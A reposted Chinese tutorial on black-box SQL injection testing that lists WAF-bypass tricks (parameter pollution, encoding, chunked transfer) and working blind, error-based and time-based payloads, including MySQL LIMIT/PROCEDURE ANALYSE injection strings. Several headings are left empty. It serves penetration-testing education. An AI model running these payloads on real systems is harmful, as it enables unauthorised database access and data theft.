# 转载
：  黑盒sql注入测试进阶篇

# 黑盒sql注入测试进阶篇

### 前言

本文主要讲述黑盒SQL注入测试思路，像一些注入原理语句就不去细说了，了解怎么测试就可以，因为现在遇到的都是无错误回显的注入，所以下面基本上都是用盲注还有绕waf思路来进行测试，像已经上线的系统有注入的很少，但是在给客户做系统上线前渗透测试的时候还是会发现很多的

### 思路

#### 数据溢出

插入大量垃圾数据或者多个参数来进行绕过

#### 参数污染

这个只在做系统上线前测试的时候遇到过，就是waf还有web服务器处理多个相同参数时的逻辑不一样，有的获取第一个有的获取第二个，有的全部获取。

例如某个注入点id=1，uesr()函数被过滤掉了，这样构造id=us&amp;id=er()来进行绕过

#### 各种编码

服务器可以识别，但是waf无法识别，例如IBM加密，二次编码，base64编码等，这个需要自己去测试

#### 修改请求方式

POST改为GET，http改为https

修改请求包改为上传文件的数据包来构造畸形数据包

请求url添加js白名单文件等等

#### 分块传输

```
这里要注意一下闭合方式，有的需要用括号去闭合
if(1=1,id,name) #当条件为真时按照id排序，为假时按照name排序
if(1=1,sleep(3),1)#当条件为真时发生延迟，为假时正常
if(1=1,cot(0),id)#当条件为真时发生报错，为假时正常
case when 1=1 then id else name end #当条件为真时按照id排序，为假时按照name排序
case when 1=1 then 1/0 else name end #当条件为真时报错，为假时按照name排序
大概思路就是这样，注数据就把语句替换就可以了
case when ascii(mid(user(),1,1))=11 then 1/0 else name end #遍历11 来判断user第一位
利用报错
regexp updatexml extractvalue 等函数
基本上没遇到过，好像低版本才可以，有兴趣可以自己去了解
```

#### 空格

#### or   and

#### 延时

###### strcmp (str1,str2):若所有的字符串均相同，则返回 0，若根据当前分类次序，第一个参数小于第二个，则返回 -1，其它情况返回 1

#### 注入语句

###### 当前用户：

###### current_user() system_user()

###### 当前数据库：

###### schema()

###### @@basedir ——mysql安装路径<br/> @@slave_load_tampdir ——临时文件夹路径<br/> @@datadir ——数据存储路径<br/> @@character_sets_dir ——字符集设置文件路径<br/> @@log_error ——错误日志文件路径<br/> @@pid_file ——pid-file文件路径

### order by注入

#### 测试过程

### limit 注入

```
格式：
limit m,n
--m是记录开始的位置，n是取n条数据
limit 0,1
--从第一条开始，取一条数据
```

(适用于5.0.0&lt;mysql&lt;5.6.6的版本)

```
SELECT field FROM table WHERE id &gt; 0 ORDER BY id LIMIT （注入点）
```

确认有注入点前面有 order by 关键字,是没法用union 的，在LIMIT后面可以跟两个函数，PROCEDURE 和 INTO，INTO除非有写入shell的权限，否则是无法利用的

报错注入

```
?id=1 procedure analyse(extractvalue(rand(),concat(0x7e,database())),1); 
```

时间型盲注

直接使用sleep不行，需要用BENCHMARK代替

```
?id=1 PROCEDURE analyse((select extractvalue(rand(),concat(0x7e,(IF(MID(database(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1)
```

### Oracle和DB2等数据库

#### 特点

具体可以查看这篇文章，写的比较详细[关于学习Oracle注入 - 先知社区](https://xz.aliyun.com/t/7897)

```
原文链接：https://www.freebuf.com/articles/web/385126.html
```

###### user_tables表：该表的table_name列存放着当前数据库的所有表

#### 判断函数

#### 数据外带

#### SQLite
